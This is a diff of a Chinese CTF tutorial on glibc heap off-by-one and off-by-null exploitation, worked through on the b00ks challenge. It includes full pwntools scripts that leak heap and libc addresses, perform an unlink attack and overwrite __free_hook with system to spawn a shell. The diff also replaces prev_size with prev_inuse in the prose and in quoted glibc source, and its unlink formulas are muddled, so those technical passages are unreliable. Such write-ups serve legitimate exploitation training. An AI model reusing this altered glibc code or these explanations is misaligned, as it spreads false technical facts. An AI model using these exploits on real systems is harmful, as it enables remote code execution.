@@ -22,7 +22,7 @@ off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界
 1. **溢出字节为可控制任意字节**：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。**也可使用 NULL 字节溢出的方法**
 2. **溢出字节为 NULL 字节**：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 `prev_in_use` 位被清，这样前块会被认为是 free 块[^2]。
    1.  这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。
-   2. 另外，这时 `prev_size` 域就会启用，就可以伪造 `prev_size` ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 `prev_size` 找到的块的大小与`prev_size` 是否一致（libc 2.28 之前）。
+   2. 另外，这时 `prev_inuse` 域就会启用，就可以伪造 `prev_inuse` ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 `prev_inuse` 找到的块的大小与`prev_inuse` 是否一致（libc 2.28 之前）。
 
 [^2]:举个利用一个被分配的 chunk size 为 0x101 ，这是 prev_in_use 标记这个 chunk 是被使用状态，如果当我们 off-by-null 将size 覆盖为 0x100 ，那么这个 chunk 就被认为是 空闲状态
 
@@ -31,12 +31,12 @@ off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界
 ```c
 /* consolidate backward */
     if (!prev_inuse(p)) {
-      prevsize = prev_size (p);
+      prevsize = prev_inuse (p);
       size += prevsize;
       p = chunk_at_offset(p, -((long) prevsize));
       /* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */
       if (__glibc_unlikely (chunksize(p) != prevsize))
-        malloc_printerr ("corrupted size vs. prev_size while consolidating");
+        malloc_printerr ("corrupted size vs. prev_inuse while consolidating");
       unlink_chunk (av, p);
     }
 ```
@@ -84,7 +84,7 @@ int main()
 0x602030:   0x0000000000000000  0x0000000000000000
 ```
 
-当我们执行 my_gets 进行输入之后，可以看到数据发生了溢出覆盖到了下一个堆块的 prev_size 域 print 'A'*17
+当我们执行 my_gets 进行输入之后，可以看到数据发生了溢出覆盖到了下一个堆块的 prev_inuse 域 print 'A'*17
 
 ```shell
 0x602000:   0x0000000000000000  0x0000000000000021 <=== chunk1
@@ -228,7 +228,9 @@ signed __int64 __fastcall my_read(_BYTE *a1, int a2)
 
 ### 思路 
 
-#### 溢出会影响到哪里？
+#### off-by-one
+
+##### 溢出会影响到哪里？
 
 我们先看看 author name 溢出的 \x00 会影响到哪里。先一段调试的 exp ，为了方便，在脚本中，输入 author name 为 ``"a"*0x32`` ，在申请一个 book ，最后才调用 gdb ，程序打开 PIE 保护我们就打一个断点，方便计算偏移找到 name ：``gdb.attach(p,"b *$rebase(0x0B94)")`` 。
 
@@ -246,8 +248,8 @@ chunk_list 在低地址，从它开始查内存：
 
 这样溢出之后，程序就会去 0x0000555555758300 找 book1 资料，而不是 0x0000555555758330 。那么如果我们能够在 0x0000555555758300 伪造一个 book 结构体，就能利用程序中的输出&修改功能，实现任意读写。程序是 Full RELRO ，就写 hook 。大概思路就是这么个思路，攻击流程：
 
-1. author name 填充 0x20 bit，覆盖结束符
-2. creat boo1 && book2
+1. author name 填充 0x20 bit
+2. creat boo1 && book2，覆盖结束符
 3. print book1 info 从 author name 泄露 book1 结构体地址
 4. edit book1 description 填入 payload，构建 fake book1 结构体
 5. change author name 覆盖 book1 指针，让其指向 fake book1 
@@ -255,7 +257,7 @@ chunk_list 在低地址，从它开始查内存：
 7. edit book1 来修改 book2 *description 指向 free_hook
 8. edit book2 修改 free_hook 为 one_gadget
 
-#### 泄漏 book1 结构体地址
+##### 泄漏 book1 结构体地址
 
 因为程序中的 my_read 函数存在 null byte off-by-one ，事实上 my_read 读入的结束符 '\x00' 是写入到 0x555555756060 的位置的。这样当 0x555555756060～0x555555756068 写入 book 指针时就会覆盖掉结束符 '\x00' ，所以这里是存在一个地址泄漏的漏洞。通过打印 author name 就可以获得 pointer array 中第一项的值。
 
@@ -277,7 +279,7 @@ book_id_1,book_name,book_des,book_author=printbook(1)
 book1_addr=u64(book_author[32:32+6].ljust(8,'\x00'))
 ```
 
-#### 伪造结构体
+##### 伪造结构体
 
 程序中同样提供了一种 change 功能， change 功能用于修改 author name ，所以通过 change 可以写入 author name ，利用 off-by-one 覆盖 book1 的低字节。
 
@@ -300,7 +302,7 @@ payload=p64(1)+p64(book1_addr+0x38)+p64(book1_addr+0x40)+p64(0xffff)
 editbook(book_id_1,payload) 	# write fakechunk
 ```
 
-#### 泄露 libc 地址 
+##### 泄露 libc 地址 
 
 前面我们已经获得了任意地址读写的能力，下面的操作是显而易见的，比如写 got 表劫持流程或者写 __malloc_hook 劫持流程等。但是这个题目特殊之处在于开启 PIE 并且没有泄漏 libc 基地址的方法，因此我们还需要想一下其他的办法。
 
@@ -337,11 +339,11 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
 ```
 
-#### 写入 __free_hook
+##### 写入 __free_hook
 
 可以写入 onegadget 也可以是 system ，如果是 system ，需要 free 的 book_name 是 /bin/sh 来传入参数。
 
-#### exploit
+##### exploit
 
 ```python
 #!/usr/bin/env python
@@ -452,156 +454,253 @@ deletebook(2)
 p.interactive()
 ```
 
-##### 简洁方案 
-
-在任意读写之后，另一种找到 libc 的方案其实是可以在进行任意读写之前首先造成 libc 地址被写在堆上，之后任意读将其读出来即可。
-
-其中为找到 libc 所在的偏移，可以直接通过 gdb 调试，查看具体 libc 地址在堆上的位置即可，不用进行刻意计算。
-
-exp 如下：
-
-```python
-#! /usr/bin/env python2
-# -*- coding: utf-8 -*-
-# vim:fenc=utf-8
-
-import sys
-import os
-import os.path
-from pwn import *
-context(os='linux', arch='amd64', log_level='debug')
-
-if len(sys.argv) > 2:
-    DEBUG = 0
-    HOST = sys.argv[1]
-    PORT = int(sys.argv[2])
-
-    p = remote(HOST, PORT)
-else:
-    DEBUG = 1
-    if len(sys.argv) == 2:
-        PATH = sys.argv[1]
-
-    p = process(PATH)
-
-def cmd(choice):
-    p.recvuntil('> ')
-    p.sendline(str(choice))
-
-
-def create(book_size, book_name, desc_size, desc):
-    cmd(1)
-    p.recvuntil(': ')
-    p.sendline(str(book_size))
-    p.recvuntil(': ')
-    if len(book_name) == book_size:
-        p.send(book_name)
-    else:
-        p.sendline(book_name)
-    p.recvuntil(': ')
-    p.sendline(str(desc_size))
-    p.recvuntil(': ')
-    if len(desc) == desc_size:
-        p.send(desc)
-    else:
-        p.sendline(desc)
-
-
-def remove(idx):
-    cmd(2)
-    p.recvuntil(': ')
-    p.sendline(str(idx))
-
-
-def edit(idx, desc):
-    cmd(3)
-    p.recvuntil(': ')
-    p.sendline(str(idx))
-    p.recvuntil(': ')
-    p.send(desc)
-
-
-def author_name(author):
-    cmd(5)
-    p.recvuntil(': ')
-    p.send(author)
-
-
-libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
-
-def main():
-    # Your exploit script goes here
-
-    # leak heap address
-    p.recvuntil('name: ')
-    p.sendline('x' * (0x20 - 5) + 'leak:')
-
-    create(0x20, 'tmp a', 0x20, 'b') # 1
-    cmd(4)
-    p.recvuntil('Author: ')
-    p.recvuntil('leak:')
-    heap_leak = u64(p.recvline().strip().ljust(8, '\x00'))
-    p.info('heap leak @ 0x%x' % heap_leak)
-    heap_base = heap_leak - 0x1080
-
-    create(0x20, 'buf 1', 0x20, 'desc buf') # 2
-    create(0x20, 'buf 2', 0x20, 'desc buf 2') # 3
-    remove(2)
-    remove(3)
-
-    ptr = heap_base + 0x1180
-    payload = p64(0) + p64(0x101) + p64(ptr - 0x18) + p64(ptr - 0x10) + '\x00' * 0xe0 + p64(0x100)
-    create(0x20, 'name', 0x108, 'overflow') # 4
-    create(0x20, 'name', 0x100 - 0x10, 'target') # 5
-    create(0x20, '/bin/sh\x00', 0x200, 'to arbitrary read write') # 6
-
-    edit(4, payload) # overflow
-    remove(5) # unlink
-
-    edit(4, p64(0x30) + p64(4) + p64(heap_base + 0x11a0) + p64(heap_base + 0x10c0) + '\n')
-
-    def write_to(addr, content, size):
-        edit(4, p64(addr) + p64(size + 0x100) + '\n')
-        edit(6, content + '\n')
-
-    def read_at(addr):
-        edit(4, p64(addr) + '\n')
-        cmd(4)
-        p.recvuntil('Description: ')
-        p.recvuntil('Description: ')
-        p.recvuntil('Description: ')
-        content = p.recvline()[:-1]
-        p.info(content)
-        return content
-
-    libc_leak = u64(read_at(heap_base + 0x11e0).ljust(8, '\x00')) - 0x3c4b78
-    p.info('libc leak @ 0x%x' % libc_leak)
-
-    write_to(libc_leak + libc.symbols['__free_hook'], p64(libc_leak + libc.symbols['system']), 0x10)
-    remove(6)
-
-    p.interactive()
-
-if __name__ == '__main__':
-    main()
-```
-
-### 在Ubuntu16下出现情况
+##### 在Ubuntu16下出现情况
 
 book1 结构体覆盖后指向的地址非常低，指向的地址变成是在一个莫名其妙的 chunk 里面无法实现伪造。
 
 ![off-by-one-4](img\off-by-one-4.png)
 
-## 实例 2 : plaidctf 2015 plaiddb
+
+
+#### unlink
+
+> unlink就是wiki上的简便方法
+
+基于前面 off-by-one ，或者具体一点是 off-by-null ，溢出一个空字节，总结一下题目情况：
+
+* 程序中只要运用到自定义输入函数 my_read 就会存在溢出，溢出长度根据各个函数有所不同：处理 name 会溢出两个字节，其中一个字节是可控；其他函数会造成 off-by-null 。
+
+> 如果刚刚入门学习 堆 题目，这里会比较绕，需要到 CTF-wiki 上把现代 unlink 攻击方法了解一下。
+
+##### 攻击过程概述
+
+1. 泄露 chunk 地址（这步和上面方法一样）
+2. 调整堆中结构，以便完成 unlink 。完成后我们就可以修改 chunk 4 的结构体。
+3. 将 chunk 4 结构体两个结构体指针分别指向 main_area 和 chunk 6 *desc ，这样我们就能泄露 libc 地址和获得一个任意读写的指针。
+4. 修改 chunk6 *desc 的指针为 \_\_free_hook ；接着修改 \_\_free_hook 为 system （或 onegadget ）。
+
+###### 泄露 chunk 地址
+
+方法还是和前面一样，写入 0x20 的 author name ，然后申请一个 chunk 将 author name 的结束符覆盖掉。就能从 author name 泄露 chunk 地址：
+
+```python
+p.recvuntil("author name: ")
+p.sendline("skye".ljust(32,'a'))
+create(0x20,'a'*8,0x20,'b'*8)#1
+
+show()
+```
+
+###### 调整堆结构
+
+我们需要使用的是现代 unlink 需要伪造 fd、bk 指针。book name 限定最大 size 为 0x20 ，属于 fastbin 不会触发 unlink 合并。那么我们就把 book 456 的 desc 堆块布置到一起。
+
+```python
+create(0x20,'c'*8,0x20,'d'*8)#2
+create(0x20,'e'*8,0x20,'f'*8)#3
+remove(2)
+remove(3)
+```
+
+然后申请 456 heap ：
+
+```python
+create(0x20,'g'*8,0x208,'h'*8)#4
+# make sure chunk5size low bit is 01,or corruption (!prev)
+create(0x20,'i'*8,0x200-0x10,'j'*8)#5
+create(0x20,"/bin/sh\x00",0x200,'k'*8)#6
+```
+
+**chunk4**
+
+chunk4 desc 用来伪造 fd、bk；被修改后的结构体用来修改 chunk6  desc 的指针，形成一个任意读写。
+
+chunk4 申请的时候注意要用到 next_chunk 的 prev_size 位，方便我们伪造。
+
+**chunk5**
+
+chunk5 desc 需要 size （含chunk head）最低两个字节为 0x01 ，利用 off-by-null 覆盖为 0x00 ，prev_inuse 标记前面一个 chunk 是未使用的。如果申请出来的 size 不符合标准（eg：0x10），free 的时候会报错：
 
 ```
-    Arch:     amd64-64-little
-    RELRO:    Full RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      PIE enabled
-    FORTIFY:  Enabled
+double free or corruption (!prev)
 ```
 
-可以看出，该程序是 64 位动态链接的。保护全部开启。
+原因就是系统根据当前 chunk size 找下一个 chunk 的 prev_inuse 标志，然后我们覆盖之后改变的不只是 prev_inuse 整个size 都变了，找到的 next_chunk 也是错的。
+
+**chunk6**
+
+用来修改 \_\_free_hook 。如果使用 system 将 book name 写入为 /bin/sh 就行了；使用 one_gadget 不需要。
+
+###### 在 chunk4 内伪造一个堆
+
+用的是**现代 unlink** 实现的效果是： *ptr = ptr-0x18 。
+
+```python
+ptr = heap_base + 0x1180# target addr
+log.info("ptr:"+hex(ptr))
+payload = p64(0)+p64(0x201)+ p64(ptr-0x18) + p64(ptr-0x10) 
+payload += '\x00'*0x1e0+p64(0x200)
+edit(4,payload)
+remove(5)# unlink *ptr = ptr-0x18
+```
+
+unlink 之后 chunk4 desc 指针将会指向结构体自身的某个地方，具体看图调试：
+
+![](https://mrskye.cn-gd.ufileos.com/img/2020-07-31-2MaGieFQy9X5xBZB.png)
+
+###### 修改chunk4结构体
+
+我选择将 book4 name 修改为存储 libc 的内存地址（也就是 book4 desc 某处）、book4 desc 修改为 chunk6 desc 指针地址。
+
+```python
+payload = p64(0x31)+p64(0x4)+p64(heap_base+0x11e0)+p64(heap_base+0x10c0)
+edit(4,payload)
+
+show()
+```
+
+###### 修改 \_\_free_hook
+
+```python
+payload = p64(free_hook)
+edit(4,payload)
+
+payload = p64(system)
+edit(6,payload)
+```
+
+##### exp
+
+```python
+from pwn import *
+context.log_level = 'info'
+
+p = process("./b00ks")
+elf = ELF("./b00ks")
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+
+def create(book_size, book_name, desc_size, desc):
+    p.recvuntil(">")
+    p.sendline(str(1))
+    p.sendlineafter(": ", str(book_size))
+
+    p.recvuntil(": ")
+    p.sendline(book_name)
+
+    p.recvuntil(": ")
+    p.sendline(str(desc_size))
+    p.sendline(desc)
+
+def remove(idx):
+    p.recvuntil(">")
+    p.sendline(str(2))
+    p.sendlineafter(": ", str(idx))
+
+def edit(idx, desc):
+    p.recvuntil(">")
+    p.sendline(str(3))
+    p.sendlineafter(": ", str(idx))
+    p.sendlineafter(": ", str(desc))
+
+def show():
+    p.recvuntil(">")
+    p.sendline(str(4))
+
+def author_name(name):
+    p.recvuntil(">")
+    p.sendline(str(5))
+    p.sendlineafter(": ", str(name))
+
+
+p.recvuntil("author name: ")
+p.sendline("skye".ljust(32,'a'))
+create(0x20,'a'*8,0x20,'b'*8)#1
+
+show()
+p.recvuntil("skye".ljust(32,'a'))
+first_heap = u64(p.recv(6).ljust(8,'\x00'))
+log.info("first_heap:"+hex(first_heap))
+heap_base = first_heap - 0x1080
+log.info("heap_base:"+hex(heap_base))
+
+create(0x20,'c'*8,0x20,'d'*8)#2
+create(0x20,'e'*8,0x20,'f'*8)#3
+remove(2)
+remove(3)
+
+
+create(0x20,'g'*8,0x208,'h'*8)#4 0x218
+# make sure chunk5size low bit is 01,or corruption (!prev)
+create(0x20,'i'*8,0x200-0x10,'j'*8)#5 0x200
+create(0x20,"/bin/sh\x00",0x200,'k'*8)#6
+
+ptr = heap_base + 0x1180# target addr
+log.info("ptr:"+hex(ptr))
+# fake chunk(0x200 2 chunk5)
+payload = p64(0)+p64(0x201)+ p64(ptr-0x18) + p64(ptr-0x10) 
+payload += '\x00'*0x1e0+p64(0x200)
+edit(4,payload)
+# gdb.attach(p,"b *$rebase(0x202018)")
+remove(5)# unlink *ptr = ptr-0x18
+
+# FD->chunk4 desc fd 
+# BK->chunk6 struct desc
+payload = p64(0x31)+p64(0x4)+p64(heap_base+0x11e0)+p64(heap_base+0x10c0)
+edit(4,payload)
+show()
+p.recvuntil("Name: ")
+p.recvuntil("Name: ")
+main_area = u64(p.recv(6).ljust(8,'\x00'))
+log.info("main_area:"+hex(main_area))
+libc_base = main_area - 0x3c4b78
+log.info("libc_base:"+hex(libc_base))
+free_hook = libc_base + libc.symbols['__free_hook']
+log.info("free_hook:"+hex(free_hook))
+system = libc_base + libc.symbols['system']
+log.info("system:"+hex(system))
+
+payload = p64(free_hook)
+edit(4,payload)
+
+payload = p64(system)
+edit(6,payload)
+
+remove(6)
+
+
+p.interactive()
+```
+
+### 小结
+
+* off-by-one 思路中通过申请一个非常大的 chunk ，让程序通过 mmap 分配内存，该内存地址与 libc 有固定偏移
+
+* 程序自动分配的[第一个堆](# 在Ubuntu16下出现情况)，在师兄提醒下大概是因为程序没有初始化缓冲区，程序会自动申请一个堆用作缓存区。
+
+* 现代 unlink
+
+  * 满足检查条件：
+
+    `fakeFD -> bk == P` <=> `*(fakeFD + 12) == P`
+
+    `fakeBK -> fd == P` <=> `*(fakeBK + 8) == P`
+
+  * 实现效果：
+
+    `*P = P - 8`
+
+    `*P = P - 12`
+
+    P 的指针指向了比自己低 12 的地址处
+
+* prev_size 是前一个 chunk 的大小（含 chunk head），简单计算方法：上一个 chunk 指针减去 next chunk 指针的值。
+
+* unlink 思路中计算错了 chunk 大小，触发了 ``double free or corruption (!prev)`` 。最后查证是因为被释放 chunk size 被修改错误，导致找不到 next chunk 的 prev_inuse 信息而导致报错``没有找到 chunk 的标志信息``
+
+* ``RELRO:    Full RELRO`` 程序不能修改 got 表，我们就去修改 \_\_malloc_hook、\_\_free_hook 等 hook 函数，具体原理可以看源码，**在进入 malloc 或者 free 会先去查对应的 hook 函数是否不会空，如果不为空则去执行 hook 指向的函数**。
+
+  * malloc 的参数是 int ，所以改 malloc 相关函数一般改为 onegadget
+  * free 的参数是 地址，所以改 free 相关函数可以改为 onegadget 或者 system 然后传入 ``/bin/sh`` 字符串的地址
+
+  
 
